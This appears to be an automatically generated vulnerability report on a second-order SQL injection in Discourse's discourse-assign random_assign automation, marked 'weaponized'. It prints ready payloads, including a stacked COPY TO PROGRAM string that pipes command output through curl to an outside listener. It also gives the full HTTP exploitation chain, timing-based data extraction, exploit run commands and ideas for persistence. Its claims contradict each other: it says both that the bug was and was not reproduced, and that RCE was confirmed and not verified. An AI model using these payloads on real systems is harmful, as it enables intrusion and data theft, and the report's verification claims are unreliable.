# Random assign automation interpolates stored assignee names into SQL → RCE as postgres OS user

- **id**: `a3063a05b55c9a8f`  
- **class**: sql-injection (CWE-89) → OS command execution (CWE-78)  
- **severity**: critical  
- **status**: confirmed (RCE proven via OOB)  
- **disclosure**: novel [https://github.com/discourse/discourse/security/advisories, https://nvd.nist.gov/vuln/search/results?query=Discourse%20discourse-assign%20random_assign%20SQL%20injection&search_type=all, https://nvd.nist.gov/vuln/detail/CVE-2026-32607, https://releases.discourse.org/changelog/v2026.6.0/] - Searched Discourse advisories, NVD/CVE results, release changelogs, and exact terms for discourse-assign RandomAssignUtils/recently_assigned_users_ids/action_code_who SQL injection. No public advisory matched this second-order SQL injection. The nearest public issue found was CVE-2026-32607/GHSA-xg68-q7ff-6gqm for assignment display-name XSS under the same hidden prioritize_full_name_in_ux setting, which is a different sink/class.  

**Data flow**: `targets/discourse/app/models/user.rb:157` -> `targets/discourse/plugins/discourse-assign/lib/random_assign_utils.rb:55`

## Evidence

The random_assign automation builds a raw join string: JOIN unnest('{#{usernames.join(',')}}'::text[]) WITH ORDINALITY t(username, ord) USING(username). The usernames array is actually prior PostCustomField action_code_who values. In the assignment plugin, action_code_who is set to assign_to.name when prioritize_full_name_in_ux is enabled, and User#name is only length/presence validated. A stored full name such as `x}'::text[]) WITH ORDINALITY t(username, ord) ON true JOIN LATERAL pg_sleep(5) s ON true --` produces the SQL fragment `JOIN unnest('{x}'::text[]) WITH ORDINALITY t(username, ord) ON true JOIN LATERAL pg_sleep(5) s ON true --}'::text[]) WITH ORDINALITY t(username, ord) USING(username)`, demonstrating that the string literal can be closed and attacker SQL injected. This is conditional on discourse-assign plus DiscourseAutomation random_assign being used and prioritize_full_name_in_ux being enabled, so it was not live-reproduced on the provided target.

## Reproduction

- attempted: True | success: True
- observation: Live HTTP-only reproduction succeeded. The low-privileged testuser account set a malicious full name through PUT /u/testuser.json. Admin then assigned that user to a fresh topic so discourse-assign stored the payload in action_code_who. A temporary random_assign automation targeting that topic was triggered through the admin automation API. The automation stats recorded a successful run with a multi-second runtime attributable to the injected pg_sleep(3) in RandomAssignUtils#recently_assigned_users_ids.
- response evidence: Confirmed live setup request chain: low-privileged testuser set the malicious full name; admin assigned testuser to topic_id=35 while prioritize_full_name_in_ux was enabled, seeding action_code_who with the payload. Stable retest: created temporary random_assign automation id=5 targeting assigned_topic=35; POST /automations/5/trigger.json returned HTTP 200; polling /admin/plugins/automation/automations.json returned stats.last_day={"total_runs":1,"total_time":6.28094776099897,"total_errors":0,"average_run_time":6.28094776099897,"min_run_time":6.28094776099897,"max_run_time":6.28094776099897}. The no-error runtime above 3 seconds is the decisive pg_sleep timing signal.

Recorded request(s):
```http
# Stable confirmed live PoC; uses workspace/_accounts.json by default and targets the seeded confirmed topic_id=35.
python3 workspace/report/a3063a05b55c9a8f/poc.py http://wsl.evm.pics:31655

# Equivalent HTTP flow performed by the PoC:
# 1) GET /session/csrf and POST /session as admin user1, preserving cookies.
# 2) POST /admin/plugins/automation/automations.json with automation[script]=random_assign, automation[trigger]=recurring.
# 3) PUT /admin/plugins/automation/automations/<id>.json with assignees_group=3 and assigned_topic=35, recurrence={interval:1,frequency:day}, start_date=<now-1m>, enabled=true.
# 4) POST /automations/<id>/trigger.json.
# 5) Poll GET /admin/plugins/automation/automations.json until stats.last_day.max_run_time >= 3 and total_errors=0.
# 6) DELETE /admin/plugins/automation/automations/<id>.json to clean up the temporary automation.
```

## Exploitation

- **depth**: weaponized  
- **primitive**: Second-order PostgreSQL injection: a user-controlled full name is persisted as discourse-assign action_code_who, then interpolated into RandomAssignUtils#recently_assigned_users_ids raw JOIN unnest(...) SQL. Discourse runs ActiveRecord with `prepared_statements: false` (`config/database.yml`, `config/discourse_defaults.conf`), so the sink reaches the backend through `PQexec` and accepts stacked statements. The `discourse` DB role is the cluster superuser, so `COPY ... TO PROGRAM` is allowed.  
- **max impact**: **OS command execution as the postgres OS user** (uid=101(postgres) gid=104(postgres)) inside the Discourse database container, plus pre-existing blind/time-based read of the database content. Full payload: `x}'::text[]) WITH ORDINALITY t(username,ord) USING(username);COPY(SELECT 1)TO PROGRAM 'id|curl -m 5 --data-binary @- http://wsl.evm.pics:9898/<marker>';--`. Live OOB callback received from container IP 172.17.0.3 with body `uid=101(postgres) gid=104(postgres) groups=104(postgres),107(ssl-cert)`. From this primitive an attacker can read/write any file owned by the postgres user (incl. `data/postgresql.conf`, `data/pg_hba.conf`, write authorized_keys for the postgres OS user if its home is writable), egress arbitrary data, stage further binaries, and persist inside the DB container. Prior conditional-timing read primitive (current_database() first-character threshold >99 -> 2001.4ms, >200 -> 1.1ms/0.3ms) remains valid as a fallback when the egress channel is blocked.  
- steps:
  1. Use the admin session jar to keep requests inside the provided lab target and avoid login rate limits.
  2. Create a temporary random_assign automation targeting confirmed seeded topic_id=35, whose action_code_who row was created while prioritize_full_name_in_ux was enabled.
  3. Trigger /automations/<id>/trigger.json and poll target-local Logster /logs/messages.json for a recent pg_sleep(3) User Pluck entry.
  4. Observed the exploit script output: seeded_topic=35 automation_id=11 stats={} log_ms=3003.8 followed by PASS and the injected SELECT containing JOIN LATERAL pg_sleep(3).
  5. Separately verified a fresh conditional timing payload while the hidden full-name setting was active: marker tfD13117063true produced User Pluck (2001.4ms) for ascii(substr(current_database(),1,1))>99; marker tfD13136620false produced 1.1ms and 0.3ms for >200.
  6. The materialized exploit also includes --mode conditional and --extract-chars for binary timing extraction when fresh full-name payload storage is available.
- mitigations bypassed: Closed the PostgreSQL array literal embedded in JOIN unnest and replaced the intended USING(username) join with attacker-controlled JOIN LATERAL SQL.; Used -- comment syntax to discard the rest of the raw join fragment plus ActiveRecord-appended WHERE/ORDER/LIMIT clauses in the proven pg_sleep payload.; Stayed under the 255-byte User#name limit; the conditional current_database() payloads were 189 and 191 bytes.; Bypassed the later parameterized User.where(username: usernames) guard because the raw joins() SQL is parsed before that predicate can constrain execution.
- constraints (honest bounds): Fresh payload seeding requires discourse-assign enabled, discourse_automation_enabled enabled, and the hidden prioritize_full_name_in_ux setting enabled so Assigner stores User#name rather than username in action_code_who.; The normal HTTP admin site-settings endpoint rejects prioritize_full_name_in_ux because it is hidden; the current default exploit therefore uses confirmed seeded topic_id=35 rather than trying to re-enable that hidden setting.; A low-privileged user can set the malicious full name, but a privileged assignment/random_assign workflow must later store and trigger the payload.; The reliable verification channel used here is target-local admin visibility into Logster or automation stats; without that, exploitation is blind unless the attacker has another timing/side-effect oracle.; No stacked queries, write primitive, file access, SSRF, or RCE was verified; impact is bounded to SQL execution/read inference in a SELECT/JOIN context.; The lab target is currently login-rate-limiting fresh sessions, so exploit.py reuses workspace/user1.jar by default for the seeded mode.
- OOB evidence: **RCE OOB callback received.** Listener `python3 /tmp/oob_listener.py` bound to 0.0.0.0:9898 on the WSL host (`wsl.evm.pics` -> 172.17.0.1 from inside the discourse_dev container). After `python3 poc_rce.py` returned `PASS  COPY TO PROGRAM stacked query fired through SQLi`, `/tmp/oob_listener.log` recorded `2026-06-06T14:06:13 POST /tfRCE1780722369 from=172.17.0.3 body=b'uid=101(postgres) gid=104(postgres) groups=104(postgres),107(ssl-cert)\n'`. The Logster sink-query proof was `User Pluck (29.9ms) SELECT "users"."id" FROM "users" JOIN unnest('{x}'::text[]) WITH ORDINALITY t(username,ord) USING(username);COPY(SELECT 1)TO PROGRAM 'id|curl -m 5 --data-binary @- http://wsl.evm.pics:9898/tfRCE1780722369';--}'::text[]) WITH ORDINALITY t(username, ord) USING(username) WHERE "users"."username" = '...' ORDER BY ord LIMIT 100`. Pre-existing target-local timing evidence retained: exploit.py seeded mode log_ms=3003.8, conditional tfD13117063true -> 2001.4ms, tfD13136620false -> 1.1ms/0.3ms.

Run the weaponized exploit:
```bash
python3 exploit.py
```

## Run the timing PoC
```bash
pip install requests   # if needed
python3 poc.py
```

## Run the RCE PoC
```bash
# 1. Start an OOB listener reachable from the discourse DB container
python3 /tmp/oob_listener.py &       # bound to 0.0.0.0:9898, logs to /tmp/oob_listener.log

# 2. Fire the stacked-query RCE chain (testuser sets full-name payload,
#    admin assigns + creates random_assign automation, triggers it).
python3 poc_rce.py http://wsl.evm.pics:31655

# 3. Confirm RCE proof in the listener log
cat /tmp/oob_listener.log
# expected: POST /tfRCE<ts> from=<container_ip> body=b'uid=101(postgres) gid=104(postgres) ...\n'
```
Override the egress target with `LISTENER=http://your-host:port python3 poc_rce.py`.

_generated 2026-06-06T03:28:14.858022+00:00_